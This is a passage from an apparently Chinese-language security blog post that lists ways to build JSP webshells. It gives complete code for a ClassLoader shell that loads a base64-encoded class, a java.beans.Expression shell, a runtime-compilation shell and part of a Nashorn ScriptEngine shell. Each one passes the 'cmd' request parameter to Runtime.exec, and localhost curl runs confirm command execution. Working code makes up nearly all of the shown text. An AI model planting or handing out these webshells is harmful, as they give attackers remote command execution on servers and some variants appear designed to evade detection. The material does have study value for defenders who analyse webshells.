class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jfxrt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/localedata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/nashorn.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunec.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunjce_provider.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunpkcs11.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/zipfs.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>javaws.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jce.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jfr.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jfxswt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jsse.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/management-agent.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>plugin.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/resources.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>rt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>ant-javafx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>dt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>javafx-mx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>jconsole.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>packager.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>sa-jdi.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>tools.jar:<span class="regexp">/Users/</span>shadowflow<span class="regexp">/code/</span>java<span class="regexp">/sec/</span>target/classes Util</span><br><span class="line">objc[<span class="number">13083</span>]: Class JavaLaunchHelper is implemented <span class="keyword">in</span> both <span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java (<span class="number">0</span>x10ae674c0) and <span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib/libinstrument.dylib (<span class="number">0</span>x10aee14e0). One of the two will be used. Which one is undefined.</span><br><span class="line">yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp<span class="regexp">//</span>qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL<span class="regexp">/AC0ABAcAIgcAIwcAJAcAJQAA/</span>AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将结果复制出来，==复制的时候不要双击复制，这样复制不全==</p>
<p>插入classloader.jsp</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    ClassLoader classLoader = <span class="keyword">new</span> ClassLoader() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            <span class="keyword">if</span>(name.contains(<span class="string">&quot;Exp&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">            <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL/AC0ABAcAIgcAIwcAJAcAJQAA/AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, code, <span class="number">0</span>, code.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; con = clazz.getConstructor(String.class);</span><br><span class="line">    String result = con.newInstance(cmd).toString();</span><br><span class="line">    response.getWriter().println(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    response.getWriter().println(result);</span><br><span class="line">    response.getWriter().println(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow<span class="meta">@ShadowOS</span> /tmp]% curl http:<span class="comment">//localhost:8080/jspshell_war/classloader.jsp?cmd=whoami</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="xml">shadowflow</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure>



<h2 id="9-BeansExpression"><a href="#9-BeansExpression" class="headerlink" title="9. BeansExpression"></a>9. BeansExpression</h2><p>通过<code>java.beans.Expression</code>来执行<code>getRuntime()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.beans.Expression&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Expression expr = <span class="keyword">new</span> Expression(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Object[]&#123;cmd&#125;);</span><br><span class="line">    Process process = (Process) expr.getValue();</span><br><span class="line">    InputStream in = process.getInputStream();</span><br><span class="line"></span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    InputStreamReader resultReader = <span class="keyword">new</span> InputStreamReader(in);</span><br><span class="line">    BufferedReader stdInput = <span class="keyword">new</span> BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s=stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sb.append(s).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getWriter().print(sb.toString());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="10-动态编译"><a href="#10-动态编译" class="headerlink" title="10. 动态编译"></a>10. 动态编译</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Files&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Paths&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.JavaCompiler&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.ToolProvider&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.DiagnosticCollector&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Locale&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.Charset&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.tools.StandardJavaFileManager&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLClassLoader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    String tmpPath = Files.createTempDirectory(<span class="string">&quot;xxxooo&quot;</span>).toFile().getPath();</span><br><span class="line">    String code = <span class="string">&quot;import java.io.BufferedReader;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import java.io.InputStreamReader;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;public class Exp &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    String res;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    public Exp(String cmd) throws Exception&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        StringBuilder stringBuilder = new StringBuilder();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        while((line=reader.readLine())!=null)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            stringBuilder.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;       this.res = stringBuilder.toString();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    @Override\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    public String toString() &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        return res;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Files.write(Paths.get(tmpPath + File.separator + <span class="string">&quot;Exp.java&quot;</span>), code.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">    JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();</span><br><span class="line">    DiagnosticCollector diagnosticCollector = <span class="keyword">new</span> DiagnosticCollector();</span><br><span class="line">    StandardJavaFileManager standardJavaFileManager = javaCompiler.getStandardFileManager(diagnosticCollector, Locale.CHINA, Charset.forName(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    Iterable fileObjects = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + <span class="string">&quot;Exp.java&quot;</span>);</span><br><span class="line">    javaCompiler.getTask(<span class="keyword">null</span>, standardJavaFileManager, diagnosticCollector, <span class="keyword">null</span>, <span class="keyword">null</span>, fileObjects).call();</span><br><span class="line"></span><br><span class="line">    URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:&quot;</span> + tmpPath + File.separator)&#125;);</span><br><span class="line">    Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    Object obj = constructor.newInstance(cmd);</span><br><span class="line"></span><br><span class="line">    response.getWriter().println(obj);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl http:<span class="regexp">//</span>localhost:<span class="number">8080</span><span class="regexp">/jspshell_war/</span>javac.jsp\?cmd\=whoami</span><br><span class="line">shadowflow</span><br></pre></td></tr></table></figure>











<h2 id="11-ScriptEngine"><a href="#11-ScriptEngine" class="headerlink" title="11. ScriptEngine"></a>11. ScriptEngine</h2><p>test.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    importPackage(Packages.java.lang);</span><br><span class="line">    <span class="keyword">var</span> cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> x = java.lang.Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="keyword">return</span> x.getInputStream();</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>

<p>将test.js放入scriptEngine.jsp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.beans.Expression&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.script.ScriptEngine&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String jsCode = <span class="string">&quot;function test() &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        load(\&quot;nashorn:mozilla_compat.js\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125; catch (e) &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    importPackage(Packages.java.lang);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    var cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    var x = java.lang.Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    return x.getInputStream();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;test();&quot;</span>;</span><br><span class="line">    ScriptEngine scriptEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span 